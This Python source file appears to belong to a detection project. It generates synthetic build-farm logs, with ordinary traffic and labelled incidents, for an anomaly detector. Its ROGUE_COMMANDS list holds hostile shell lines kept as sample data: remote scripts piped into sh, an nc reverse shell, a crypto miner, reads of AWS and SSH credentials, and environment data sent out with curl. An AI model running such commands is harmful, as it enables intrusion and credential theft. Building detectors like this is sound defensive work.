"""
Watchtower synthetic build-log producer.

Simulates the build logs of a mid-sized company's build farm: roughly 180
runners across developer workstations, build servers, a CI farm and
spot-instance and vendor agents, plus occasional incidents that make a
runner misbehave -- an out-of-memory storm, a crashing compiler, a poisoned
cache.

WHY A POPULATION, NOT A HANDFUL OF RUNNERS
------------------------------------------
With 4 runners, every one looks busy -- 25 events/sec each -- and "high
volume" is meaningless. With ~180 runners sharing 100 events/sec, a typical
runner emits well under one event/sec, so one producing 30 failures/sec is
genuinely exceptional. That contrast is the entire signal the detector
works from.

Traffic is deliberately UNEVEN. A few runners (the CI farm) generate far
more than everyone else, and they are entirely healthy. They exist here on
purpose: they are the false positives a detector has to learn not to flag.
A system that alerts on volume alone will flag the CI farm every morning.

INCIDENT RATE
-------------
Incidents are episodic and rare, around 5-10% of traffic. That is not
cosmetic -- a stream that is half incident traffic inflates apparent recall
and hides how much detection actually costs. Raise INCIDENT_START_CHANCE
for a demo, but do not judge alert volume or API cost from such a run.

Incidents strike ORDINARY runners, ones that also carry on with their
normal work: there is no "bad IP" to learn, only behaviour.

Every event carries `scenario` -- "normal" or the incident name. That is
GROUND TRUTH for evaluation, not a feature. The ETL parse schema does not
read it, so it never reaches the detector.
"""

import io
import itertools
import json
import os
import random
import sys
import time
import uuid
from datetime import datetime, timezone

import fastavro
from kafka import KafkaProducer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from schemas.registry import (  # noqa: E402
    DEFAULT_SUBJECT,
    SchemaRegistry,
    frame,
    load_local_schema,
)


KAFKA_BROKER = os.getenv("KAFKA_BROKER", "localhost:9092")
KAFKA_TOPIC = os.getenv("KAFKA_TOPIC", "security-logs")
SCHEMA_REGISTRY_URL = os.getenv("SCHEMA_REGISTRY_URL", "http://localhost:8081")
LOGS_PER_SECOND = int(os.getenv("LOGS_PER_SECOND", "1000"))

# The farm grows with the rate. At 1,000 logs/sec it is ~1,780 runners, not
# 178 runners each logging 10x more: a company producing 10x the build logs
# has more machines, not chattier ones. Keeping per-runner behaviour
# constant is what keeps per-runner detection thresholds meaningful -- at
# 10x per runner, every workstation's ordinary failed builds would look
# like a failure storm. Set HOSTS_SCALE=1 for the literal 178 runners.
HOSTS_SCALE = max(1, int(os.getenv("HOSTS_SCALE", str(max(1, round(LOGS_PER_SECOND / 100))))))

# Hard ceiling on the per-second budget incidents may consume, even with
# several live at once. The remainder is always baseline traffic.
MAX_INCIDENT_SHARE = 0.25

# Chance per second that a new incident of a given kind begins, when none of
# that kind is already running.
INCIDENT_START_CHANCE = 0.003


# --- the company ----------------------------------------------------------

DEVELOPERS = [
    "a.bennani", "y.tazi", "s.elamrani", "m.chraibi", "k.idrissi",
    "n.berrada", "h.lahlou", "r.ouazzani", "f.saidi", "l.benjelloun",
    "o.fassi", "z.kabbaj", "i.alaoui", "d.sekkat", "t.mansouri",
    "j.doe", "alice", "bob", "john",
]

# Non-human accounts that start builds. They legitimately start a lot of
# them, which is exactly why they are a detector's favourite false positive.
CI_ACCOUNTS = ["svc-ci", "svc-nightly", "svc-release"]

# (project, language). Each language fixes the toolchain, the build tool
# that drives it and what a step costs.
PROJECTS = [
    ("payments-api", "java"), ("billing-core", "java"), ("ledger", "java"),
    ("auth-service", "go"), ("gateway", "go"), ("notifications", "go"),
    ("web-frontend", "ts"), ("docs-site", "ts"), ("admin-console", "ts"),
    ("search-indexer", "rust"), ("recommender", "rust"), ("infra-tools", "rust"),
    ("kernel-modules", "c"), ("firmware-agent", "c"), ("crypto-lib", "c"),
    ("ml-runtime", "cpp"), ("data-warehouse", "cpp"), ("render-engine", "cpp"),
    ("mobile-android", "java"), ("mobile-ios", "cpp"), ("telemetry", "go"),
    ("etl-jobs", "java"), ("sdk-core", "rust"), ("edge-proxy", "cpp"),
]
PROJECT_NAMES = [name for name, _ in PROJECTS]
LANG_OF = dict(PROJECTS)

# What a step costs, per language: duration ranges in ms and peak memory in
# MB for a compile, the compiler binary, the tool driving it, the file
# extension, and the build tool's user agent for dependency fetches.
LANGS = {
    "c":    dict(proc="gcc",     parent="make",   ext=".c",    tool="make",   compile=(300, 9_000),   link=(2_000, 60_000),   mem=(60, 700),
                 agent="conan/2.4.1", cmd="gcc -O2 -Wall -std=c17 -c {file} -o build/{stem}.o"),
    "cpp":  dict(proc="clang++", parent="ninja",  ext=".cc",   tool="ninja",  compile=(2_000, 60_000), link=(15_000, 230_000), mem=(300, 3_200),
                 agent="conan/2.4.1", cmd="clang++ -O2 -std=c++20 -Wall -c {file} -o build/{stem}.o"),
    "rust": dict(proc="rustc",   parent="cargo",  ext=".rs",   tool="cargo",  compile=(1_500, 45_000), link=(5_000, 120_000),  mem=(200, 2_400),
                 agent="cargo/1.82.0", cmd="rustc --edition 2021 -C opt-level=3 {file} --crate-type lib"),
    "java": dict(proc="javac",   parent="gradle", ext=".java", tool="gradle", compile=(800, 20_000),   link=(3_000, 40_000),   mem=(250, 1_800),
                 agent="gradle/8.10.2", cmd="javac -d build/classes -source 21 {file}"),
    "ts":   dict(proc="tsc",     parent="npm",    ext=".ts",   tool="npm",    compile=(500, 12_000),   link=(2_000, 30_000),   mem=(150, 1_200),
                 agent="npm/10.8.2", cmd="tsc -p tsconfig.json --outDir dist --incremental"),
    "go":   dict(proc="go",      parent="make",   ext=".go",   tool="go",     compile=(400, 8_000),    link=(1_500, 25_000),   mem=(100, 900),
                 agent="go/1.23.2", cmd="go build -o bin/{stem} {file}"),
}
LINK_COMMANDS = {
    "c": "ld -o build/app build/*.o -lc", "cpp": "clang++ -o build/app build/*.o -lstdc++",
    "rust": "rustc -C lto build/app.rlib -o build/app", "java": "jar cf build/app.jar -C build/classes .",
    "ts": "webpack --mode production", "go": "go build -ldflags='-s -w' -o bin/app ./cmd/app",
}

MODULES = ["core", "net", "storage", "auth", "parser", "codec", "sched", "cache", "api", "util"]
SOURCE_NAMES = ["parser", "lexer", "buffer", "session", "router", "index", "writer", "reader", "pool", "queue",
                "handler", "config", "metrics", "codec", "driver"]

# The failures a healthy farm has all the time: the code is wrong, not the
# machine. A detector that alerts on these alerts on every working day.
ORDINARY_COMPILE_ERRORS = [
    "error: expected ';' before '}' token",
    "error: 'foo' was not declared in this scope",
    "undefined reference to `Session::close()'",
    "error: cannot find symbol: method resolve(String)",
    "error[E0308]: mismatched types",
    "TS2345: Argument of type 'string' is not assignable to parameter of type 'number'",
    "./main.go:41:2: undefined: handler",
]
ORDINARY_TEST_FAILURES = [
    "AssertionError: expected 3 but was 4",
    "FAILED tests/test_session.py::test_expiry - assert 0 == 1",
    "--- FAIL: TestRouter (0.02s)",
    "thread 'queue::tests::drains' panicked at 'assertion failed'",
]
FAILURE_REASONS = ["compile_error", "test_failure", "link_error", "dependency_unresolved", "timeout"]
FAILURE_REASON_WEIGHTS = [46, 30, 8, 12, 4]
ORDINARY_MESSAGES = {
    "compile_error": ORDINARY_COMPILE_ERRORS,
    "test_failure": ORDINARY_TEST_FAILURES,
    "link_error": ["undefined reference to `main'", "ld: cannot find -lssl"],
    "dependency_unresolved": ["Could not resolve com.acme:legacy-client:2.1", "no matching package named `serde_xml` found"],
    "timeout": ["build exceeded 60m timeout"],
}

# What a build infrastructure problem looks like -- see core/indicators.py.
ROGUE_COMMANDS = [
    "curl -s http://185.23.44.12/x.sh | sh",
    "wget -qO- http://185.23.44.12/setup | bash",
    "./xmrig --url stratum+tcp://pool.minexmr.example:4444",
    "nc -e /bin/sh 185.23.44.12 4444",
    "cat ~/.aws/credentials",
    "printenv | curl -d @- http://185.23.44.12/env",
    "chmod +x /tmp/x.sh && /tmp/x.sh",
    "cat ~/.ssh/id_rsa",
]
UNTRUSTED_PATHS = [
    "/unofficial/mirror/libssl-9.9.jar",
    "/unverified/crates/tokio-fork/1.99.0/download",
    "/snapshots-unsigned/com/acme/core-LATEST.jar",
    "/tmp/x.sh",
    "/dl/setup.sh",
]
OOM_MESSAGES = [
    "clang: error: unable to execute command: Killed",
    "c++: fatal error: Killed signal terminated program cc1plus",
    "java.lang.OutOfMemoryError: Java heap space",
    "rustc: error: could not compile `core`: process didn't exit successfully (signal: 9, SIGKILL: kill)",
]
CRASH_MESSAGES = [
    "clang: error: clang frontend command failed due to signal (use -v to see invocation)",
    "internal compiler error: Segmentation fault",
    "PLEASE submit a full bug report, with preprocessed source if appropriate.",
    "Stack dump: 0. Program arguments: /usr/bin/clang++ -cc1",
]
TOOLCHAIN_MESSAGES = [
    "toolchain not found: clang-18",
    "No space left on device",
    "error while loading shared libraries: libstdc++.so.6: cannot open shared object file",
    "permission denied: /opt/toolchain/bin/gcc",
]
CORRUPT_MESSAGES = [
    "checksum mismatch for cache entry {h}",
    "sha256 mismatch: expected {h}",
    "corrupt cache entry {h}: unexpected end of archive",
]


class Host:
    """One runner on the network, with a role that shapes its behaviour.

    `weight` is its share of baseline traffic. Deliberately skewed: a CI
    farm runner is worth ~60 workstations.
    """

    def __init__(self, ip, role, weight, projects, hostname, accounts):
        self.ip = ip
        self.role = role
        self.weight = weight
        self.projects = projects
        self.hostname = hostname
        self.accounts = accounts


def build_network(scale=1):
    """The farm. Runner counts multiply by `scale`; every runner keeps the
    same role, weight and behaviour, so per-runner rates stay constant."""
    hosts = []

    # Developer workstations, one project each -- which is why a runner
    # suddenly failing builds of many projects is worth noticing.
    for i in range(120 * scale):
        ip = f"192.168.{1 + i // 240}.{10 + i % 240}"
        project = PROJECT_NAMES[i % len(PROJECT_NAMES)]
        hosts.append(Host(ip, "workstation", 1.0, [project], f"ws-{i:04d}", [DEVELOPERS[i % len(DEVELOPERS)]]))

    # Shared build servers: a few projects each.
    for i in range(24 * scale):
        ip = f"10.0.{10 + i // 24}.{10 + i % 24}"
        hosts.append(Host(ip, "build-server", 4.0, random.sample(PROJECT_NAMES, 2),
                          f"build-{i:03d}", CI_ACCOUNTS + DEVELOPERS[:4]))

    # The CI farm. Very high volume, entirely healthy -- the benign heavy
    # hitters that make "high volume == incident" a bad rule.
    for i in range(4 * scale):
        hosts.append(Host(f"10.0.20.{5 + i}", "ci-farm", 60.0, random.sample(PROJECT_NAMES, 2),
                          f"ci-{i:02d}", CI_ACCOUNTS))

    # Cloud spot runners on public IPs -- legitimately external, so
    # "external therefore suspicious" is a bad rule here too.
    for i in range(25 * scale):
        ip = f"102.67.{14 + i // 200}.{40 + i % 200}"
        hosts.append(Host(ip, "cloud", 2.0, [PROJECT_NAMES[i % len(PROJECT_NAMES)]],
                          f"spot-{i:03d}", ["svc-ci"]))

    # Vendor build agents.
    for i in range(5 * scale):
        ip = f"196.200.{1 + i // 50}.{10 + i % 50}"
        hosts.append(Host(ip, "vendor", 1.5, [random.choice(PROJECT_NAMES)], f"vendor-{i:02d}", ["svc-vendor"]))

    return hosts


NETWORK = build_network(HOSTS_SCALE)
# Cumulative weights computed once. random.choices(weights=...) recomputes
# them on every call -- O(hosts) per event, 1.78 million additions a second
# at 1,000 logs/sec over ~1,780 runners.
NETWORK_CUM_WEIGHTS = list(itertools.accumulate(h.weight for h in NETWORK))

# Where dependencies and artifacts are served from.
REGISTRIES = ["10.0.40.10", "10.0.40.11", "10.0.40.12"]


def _now():
    return datetime.now(timezone.utc).isoformat()


# --- identities ------------------------------------------------------------
# uids matter: 0 is root, and a detector needs to know who a step ran as.
UIDS = {"root": 0, "svc-vendor": 2001}
UIDS.update({name: 1001 + i for i, name in enumerate(DEVELOPERS)})
UIDS.update({name: 990 + i for i, name in enumerate(CI_ACCOUNTS)})


def _uid(host, account):
    """Who a step ran as. CI containers genuinely run as root about a
    third of the time -- a rule that treats root as wrong alerts on the farm."""
    if host.role == "ci-farm" and random.random() < 0.35:
        return 0
    return UIDS.get(account, 1500)


def _severity_for(event_type, outcome, status=0):
    """Severity that corresponds to the event, rather than being random.

    An earlier version chose this at random, producing nonsense such as
    BUILD_SUCCESS / severity=ERROR. A model given that field learns noise.
    """
    if outcome == "failure":
        return "ERROR"
    if event_type == "DEPENDENCY_FETCH" and status >= 400:
        return "WARNING"
    return "INFO"


def _event(event_type, runner_ip, project, hostname, scenario, **extra):
    log = {
        "event_id": str(uuid.uuid4()),
        "timestamp": _now(),
        "runner_ip": runner_ip,
        "project": project,
        "event_type": event_type,
        "hostname": hostname,
        "severity": _severity_for(event_type, extra.get("outcome"), extra.get("http_status") or 0),
        "scenario": scenario,
    }
    log.update(extra)
    return log


def _build_id():
    return uuid.uuid4().hex[:16]


def _source_file(project):
    ext = LANGS[LANG_OF.get(project, "c")]["ext"]
    return f"src/{random.choice(MODULES)}/{random.choice(SOURCE_NAMES)}{ext}"


# --- event builders: one per kind of log -----------------------------------

def build_started(src, project, host, scenario, who, build=None):
    return _event(
        "BUILD_STARTED", src, project, host, scenario,
        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], build_id=build or _build_id(),
        triggered_by=who,
    )


def build_success(src, project, host, scenario, who, duration=None):
    return _event(
        "BUILD_SUCCESS", src, project, host, scenario,
        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success", build_id=_build_id(),
        triggered_by=who,
        duration_ms=duration if duration is not None else random.randint(30_000, 1_500_000),
    )


def build_failure(src, project, host, scenario, who, reason, message, exit_code=1, duration=None):
    return _event(
        "BUILD_FAILURE", src, project, host, scenario,
        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="failure", build_id=_build_id(),
        triggered_by=who, reason=reason, error_message=message, exit_code=exit_code,
        duration_ms=duration if duration is not None else random.randint(5_000, 600_000),
    )


def compile_step(src, project, host, scenario, who, uid, *, step="compile", command=None, file=None,
                 duration=None, memory=None, cache=None, outcome="success", exit_code=0, message=None,
                 parent=None, process=None, cache_hit_rate=0.78):
    lang = LANGS[LANG_OF.get(project, "c")]
    file = file or _source_file(project)
    stem = file.rsplit("/", 1)[-1].rsplit(".", 1)[0]
    if cache is None:
        cache = "hit" if random.random() < cache_hit_rate else "miss"
    lo, hi = lang["link"] if step == "link" else lang["compile"]
    if duration is None:
        # a cache hit only restores the output
        duration = random.randint(5, 80) if cache == "hit" else random.randint(lo, hi)
    if memory is None:
        mlo, mhi = lang["mem"]
        memory = random.randint(20, 80) if cache == "hit" else random.randint(mlo, mhi)
    if command is None:
        command = LINK_COMMANDS[LANG_OF.get(project, "c")] if step == "link" else lang["cmd"].format(file=file, stem=stem)
    return _event(
        "COMPILE_STEP", src, project, host, scenario,
        log_source=lang["tool"], outcome=outcome, build_id=_build_id(), triggered_by=who,
        command=command, process_name=process or lang["proc"], process_id=random.randint(1000, 60000),
        parent_process=parent or lang["parent"], process_uid=uid, step=step, file_path=file,
        duration_ms=duration, peak_memory_mb=memory, cache_status=cache, exit_code=exit_code,
        error_message=message,
    )


def tests_run(src, project, host, scenario, who, success=True, message=None):
    return _event(
        "TEST_RUN", src, project, host, scenario,
        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success" if success else "failure",
        build_id=_build_id(), triggered_by=who, exit_code=0 if success else 1,
        duration_ms=random.randint(3_000, 400_000), peak_memory_mb=random.randint(100, 1_500),
        error_message=None if success else (message or random.choice(ORDINARY_TEST_FAILURES)),
    )


def dependency_fetch(src, project, host, scenario, who, path, status, size, agent=None, dest=None, rt=None):
    lang = LANGS[LANG_OF.get(project, "c")]
    return _event(
        "DEPENDENCY_FETCH", src, project, host, scenario,
        log_source=lang["tool"], outcome="success" if status < 400 else "failure",
        build_id=_build_id(), triggered_by=who, dest_ip=dest or random.choice(REGISTRIES),
        dest_port=443, protocol="https", http_method="GET", url_path=path, http_status=status,
        user_agent=agent or lang["agent"], bytes_sent=size,
        response_time_ms=rt if rt is not None else random.randint(8, 180),
    )


def artifact_publish(src, project, host, scenario, who, size, status=201, rt=None):
    return _event(
        "ARTIFACT_PUBLISH", src, project, host, scenario,
        log_source=LANGS[LANG_OF.get(project, "c")]["tool"], outcome="success" if status < 400 else "failure",
        build_id=_build_id(), triggered_by=who, dest_ip=random.choice(REGISTRIES), dest_port=443,
        protocol="https", http_method="PUT",
        url_path=f"/artifacts/{project}/{_build_id()}/{project}.tar.gz", http_status=status,
        user_agent=LANGS[LANG_OF.get(project, "c")]["agent"], bytes_sent=size,
        response_time_ms=rt if rt is not None else random.randint(200, 3_000),
    )


# --- baseline -------------------------------------------------------------

# Ordinary dependency fetches, per ecosystem: (path template, size range).
FETCH_PATHS = {
    "java": [("/maven2/org/apache/commons/commons-lang3/3.{n}.0/commons-lang3-3.{n}.0.jar", (500_000, 700_000)),
             ("/maven2/com/fasterxml/jackson/jackson-core/2.{n}.1/jackson-core-2.{n}.1.jar", (350_000, 600_000))],
    "go": [("/goproxy/github.com/acme/lib{n}/@v/v1.{n}.0.zip", (40_000, 800_000))],
    "ts": [("/npm/react/-/react-18.{n}.0.tgz", (90_000, 400_000)), ("/npm/lodash/-/lodash-4.17.{n}.tgz", (300_000, 600_000))],
    "rust": [("/crates/api/v1/crates/serde/1.0.{n}/download", (60_000, 90_000)),
             ("/crates/api/v1/crates/tokio/1.{n}.0/download", (700_000, 900_000))],
    "c": [("/conan/v2/conans/zlib/1.{n}/_/_/revisions/latest/files/conan_package.tgz", (100_000, 400_000))],
    "cpp": [("/conan/v2/conans/boost/1.{n}/_/_/revisions/latest/files/conan_package.tgz", (4_000_000, 30_000_000))],
}

# Each role behaves differently. A workstation compiles a bit and fetches a
# bit; the CI farm almost only compiles; vendor agents mostly fetch.
ROLE_PROFILES = {
    "workstation": (
        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
        [40, 16, 10, 11, 12, 10, 1],
    ),
    "build-server": (
        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
        [42, 14, 12, 12, 14, 2.5, 2],
    ),
    # Failures are rare here: ~0.16% of ~700 events a minute is still ~1.
    "ci-farm": (
        ["COMPILE_STEP", "DEPENDENCY_FETCH", "TEST_RUN", "BUILD_STARTED", "BUILD_SUCCESS", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
        [58, 14, 14, 3.5, 3.5, 0.15, 0.2],
    ),
    "cloud": (
        ["COMPILE_STEP", "DEPENDENCY_FETCH", "BUILD_STARTED", "BUILD_SUCCESS", "TEST_RUN", "BUILD_FAILURE", "ARTIFACT_PUBLISH"],
        [44, 16, 8, 9, 12, 5, 2],
    ),
    "vendor": (
        ["COMPILE_STEP", "DEPENDENCY_FETCH", "TEST_RUN", "BUILD_SUCCESS", "BUILD_FAILURE", "BUILD_STARTED"],
        [50, 20, 14, 8, 6, 2],
    ),
}


def _normal_fetch(host, who, project):
    lang = LANG_OF.get(project, "c")
    template, (lo, hi) = random.choice(FETCH_PATHS[lang])
    path = template.format(n=random.randint(1, 60))
    roll = random.random()
    if roll < 0.04:
        # benign noise that looks alarming in isolation: an optional
        # checksum sidecar that does not exist, a rate limit, a hiccup
        status = random.choice([404, 404, 429, 503])
        return dependency_fetch(host.ip, project, host.hostname, "normal", who, path + ".sha256", status, 150)
    if roll < 0.20:
        return dependency_fetch(host.ip, project, host.hostname, "normal", who, path, 304, 0)
    return dependency_fetch(host.ip, project, host.hostname, "normal", who, path, 200, random.randint(lo, hi))


def generate_normal():
    host = random.choices(NETWORK, cum_weights=NETWORK_CUM_WEIGHTS, k=1)[0]
    types, weights = ROLE_PROFILES[host.role]
    event_type = random.choices(types, weights=weights, k=1)[0]
    project = random.choice(host.projects)
    who = random.choice(host.accounts)
    src, name = host.ip, host.hostname

    if event_type == "DEPENDENCY_FETCH":
        return _normal_fetch(host, who, project)

    if event_type == "BUILD_STARTED":
        return build_started(src, project, name, "normal", who)

    if event_type == "BUILD_SUCCESS":
        return build_success(src, project, name, "normal", who)

    if event_type == "BUILD_FAILURE":
        # ordinary breakage: the code is wrong, not the machine
        reason = random.choices(FAILURE_REASONS, weights=FAILURE_REASON_WEIGHTS, k=1)[0]
        duration = 3_600_000 if reason == "timeout" else None
        return build_failure(src, project, name, "normal", who, reason,
                             random.choice(ORDINARY_MESSAGES[reason]),
                             exit_code=124 if reason == "timeout" else random.choice([1, 1, 2]),
                             duration=duration)

    if event_type == "TEST_RUN":
        return tests_run(src, project, name, "normal", who, success=random.random() > 0.06)

    if event_type == "ARTIFACT_PUBLISH":
        return artifact_publish(src, project, name, "normal", who, random.randint(500_000, 12_000_000))

    # COMPILE_STEP
    uid = _uid(host, who)
    roll = random.random()
    if roll < 0.015:
        return compile_step(src, project, name, "normal", who, uid, outcome="failure", exit_code=1,
                            message=random.choice(ORDINARY_COMPILE_ERRORS))
    if roll < 0.08:
        return compile_step(src, project, name, "normal", who, uid, step="link")
    if roll < 0.10:
        return compile_step(src, project, name, "normal", who, uid, step="archive", command="ar rcs build/lib.a build/*.o",
                            process="ar", duration=random.randint(100, 4_000), memory=random.randint(20, 200))
    return compile_step(src, project, name, "normal", who, uid)


# --- incidents ------------------------------------------------------------

class Incident:
    """One in-flight incident on one runner, emitting `rate` events/sec for
    `duration`. The runner is an ordinary one: it carries on with its normal
    traffic while the incident runs."""

    def __init__(self, kind, duration, rate):
        self.kind = kind
        self.remaining = duration
        self.rate = rate
        self.recovered = False

        host = random.choice(NETWORK)
        self.host = host
        self.runner_ip = host.ip
        self.hostname = host.hostname
        self.project = host.projects[0]
        self.who = host.accounts[0]
        self.uid = _uid(host, self.who)
        # A black-hole runner grabs jobs from the whole queue.
        self.victims = random.sample(PROJECT_NAMES, random.randint(8, 14))

    def tick(self):
        self.remaining -= 1
        return [self._emit() for _ in range(self.rate)]

    def _emit(self):
        return getattr(self, "_" + self.kind)()

    def _retry_storm(self):
        # The same project failing again and again on one runner, sometimes
        # ending in a green build. The pass after a wall of failures is the
        # part that matters: flaky, not fixed.
        if not self.recovered and self.remaining <= 2 and random.random() < 0.3:
            self.recovered = True
            return build_success(self.runner_ip, self.project, self.hostname, self.kind, self.who)
        reason = random.choice(["compile_error", "test_failure"])
        return build_failure(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                             reason, random.choice(ORDINARY_MESSAGES[reason]))

    def _broken_toolchain(self):
        # Failures across MANY projects -- the inverse of a retry storm: the
        # projects are fine, the runner is not.
        return build_failure(self.runner_ip, random.choice(self.victims), self.hostname, self.kind, self.who,
                             "toolchain_error", random.choice(TOOLCHAIN_MESSAGES), exit_code=127,
                             duration=random.randint(200, 4_000))

    def _oom_kill_storm(self):
        # The kernel kills compiler after compiler: exit 137, memory pinned.
        if random.random() < 0.25:
            return build_failure(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                                 "oom_killed", random.choice(OOM_MESSAGES), exit_code=137)
        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
                            outcome="failure", exit_code=137, message=random.choice(OOM_MESSAGES),
                            memory=random.randint(7_000, 16_000), duration=random.randint(20_000, 120_000),
                            cache="miss")

    def _slow_compile(self):
        # Quiet on every axis but one: steps succeed, cache and memory look
        # ordinary -- and each takes 6 to 25 minutes. Only duration gives it away.
        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
                            duration=random.randint(360_000, 1_500_000), cache="miss",
                            memory=random.randint(1_500, 5_000))

    def _dependency_not_found(self):
        # A lockfile pointing at artifacts that were never published, retried
        # in a loop: a flood of 404s on paths no build asks for.
        n = random.randint(1, 9_999)
        status = 404 if random.random() < 0.92 else 403
        return dependency_fetch(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                                f"/maven2/com/acme/legacy-{n}/1.{n % 9}/legacy-{n}-1.{n % 9}.jar", status, 150)

    def _cache_corruption(self):
        message = random.choice(CORRUPT_MESSAGES).format(h=uuid.uuid4().hex[:24])
        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
                            outcome="failure", exit_code=1, message=message, cache="corrupt",
                            duration=random.randint(50, 900))

    def _compiler_crash(self):
        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who, self.uid,
                            outcome="failure", exit_code=139, message=random.choice(CRASH_MESSAGES),
                            duration=random.randint(2_000, 40_000), cache="miss")

    def _rogue_build_step(self):
        # A build step that has no business running: a miner, a download
        # piped into a shell, credentials read out. Often after fetching
        # something from a mirror the build never uses.
        if random.random() < 0.4:
            return dependency_fetch(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                                    random.choice(UNTRUSTED_PATHS), 200, random.randint(20_000, 4_000_000))
        command = random.choice(ROGUE_COMMANDS)
        return compile_step(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                            0 if random.random() < 0.7 else self.uid, command=command,
                            process=command.split()[0].lstrip("./"), parent="sh", duration=random.randint(100, 30_000),
                            memory=random.randint(20, 400), cache="miss")

    def _artifact_bloat(self):
        # Uploads that never stop and never fail: a build directory or a
        # debug-symbol archive published on every build, filling the store.
        return artifact_publish(self.runner_ip, self.project, self.hostname, self.kind, self.who,
                                random.randint(40_000_000, 120_000_000), rt=random.randint(2_000, 9_000))


INCIDENT_KINDS = [
    # kind,                  duration (s),  rate (events/s)
    ("retry_storm",          (25, 60),      (18, 40)),
    ("broken_toolchain",     (30, 70),      (8, 18)),
    ("oom_kill_storm",       (8, 20),       (3, 9)),
    ("slow_compile",         (15, 40),      (4, 12)),
    ("dependency_not_found", (20, 50),      (15, 35)),
    ("cache_corruption",     (10, 30),      (3, 10)),
    ("compiler_crash",       (10, 30),      (3, 10)),
    ("rogue_build_step",     (8, 20),       (3, 9)),
    ("artifact_bloat",       (20, 60),      (1, 3)),
]


def maybe_start_incident(active):
    """At most one new incident per second, never two of the same kind."""
    live = {a.kind for a in active}

    for kind, duration_range, rate_range in INCIDENT_KINDS:
        if kind in live:
            continue
        if random.random() < INCIDENT_START_CHANCE:
            incident = Incident(
                kind, random.randint(*duration_range), random.randint(*rate_range)
            )
            print(
                f"  [incident] {kind} on {incident.hostname} ({incident.runner_ip}) -> "
                f"{incident.project} ({incident.rate}/s for {incident.remaining}s)",
                flush=True,
            )
            return incident

    return None


class AvroSerializer:
    """Confluent-framed Avro, using a schema id fetched from the registry.

    The producer LOOKS UP its schema; it never registers one. If the local
    schema is not already registered, startup fails with instructions rather
    than quietly publishing a new format nobody reviewed.
    """

    def __init__(self, registry_url, subject=DEFAULT_SUBJECT):
        schema_json = load_local_schema()
        self.schema_id = SchemaRegistry(registry_url).lookup_id(subject, schema_json)

        if self.schema_id is None:
            raise SystemExit(
                f"Schema in schemas/build_event.avsc is not registered under "
                f"{subject} at {registry_url}.\n"
                f"Register it first:  python tools/schema_registry.py register"
            )

        schema = json.loads(schema_json)
        self.parsed = fastavro.parse_schema(schema)

        # Every nullable field, derived from the schema itself, so a field
        # added in a later version is null-filled without a code change.
        self.optional = [
            f["name"] for f in schema["fields"]
            if isinstance(f["type"], list) and "null" in f["type"]
        ]

    def __call__(self, event):
        for field in self.optional:
            event.setdefault(field, None)

        buffer = io.BytesIO()
        fastavro.schemaless_writer(buffer, self.parsed, event)
        return frame(self.schema_id, buffer.getvalue())


def main():
    serializer = AvroSerializer(SCHEMA_REGISTRY_URL)

    # Keyed by runner_ip: every event from one runner lands on the same
    # partition. The feature stage keeps its state per runner_ip, so this
    # is what lets that state stay partition-local as Kafka scales out.
    producer = KafkaProducer(
        bootstrap_servers=KAFKA_BROKER,
        key_serializer=lambda key: key.encode("utf-8"),
        value_serializer=serializer,
        # Batches form over 5 ms at most: throughput without holding events.
        linger_ms=5,
    )

    roles = {}
    for host in NETWORK:
        roles[host.role] = roles.get(host.role, 0) + 1

    print("Starting Watchtower producer (build-farm simulation)")
    print(f"Kafka: {KAFKA_BROKER}")
    print(f"Topic: {KAFKA_TOPIC}")
    print(f"Rate:  {LOGS_PER_SECOND} logs/sec")
    print(f"Runners: {len(NETWORK)} -- " + ", ".join(f"{n} {r}" for r, n in sorted(roles.items())))
    print(f"Projects: {len(PROJECTS)}   incident ceiling: {int(MAX_INCIDENT_SHARE*100)}%")
    print(f"Schema: {DEFAULT_SUBJECT} id={serializer.schema_id} (Avro, keyed by runner_ip)", flush=True)

    active = []
    incident_budget = int(LOGS_PER_SECOND * MAX_INCIDENT_SHARE)

    try:
        while True:
            start = time.perf_counter()

            new = maybe_start_incident(active)
            if new is not None:
                active.append(new)

            batch = []
            for incident in list(active):
                if len(batch) >= incident_budget:
                    break
                batch.extend(incident.tick())
                if incident.remaining <= 0:
                    active.remove(incident)

            # Incidents never crowd out the baseline: total stays at
            # LOGS_PER_SECOND and normal traffic fills the remainder.
            batch = batch[:incident_budget]
            while len(batch) < LOGS_PER_SECOND:
                batch.append(generate_normal())

            # Real runners emit continuously, not as one burst per second:
            # each event is stamped and sent at its own moment, spread
            # evenly over the second. (Stamping 1,000 events and THEN
            # sending them all charged every event the time it took to
            # generate and send the rest -- up to a second of "latency"
            # that was the simulator's, not the pipeline's.)
            random.shuffle(batch)
            for i, log in enumerate(batch):
                delay = start + i / len(batch) - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
                log["timestamp"] = _now()
                producer.send(KAFKA_TOPIC, key=log["runner_ip"], value=log)

            time.sleep(max(0, 1 - (time.perf_counter() - start)))

    except KeyboardInterrupt:
        print("\nStopping producer...")

    finally:
        producer.flush()
        producer.close()


if __name__ == "__main__":
    main()
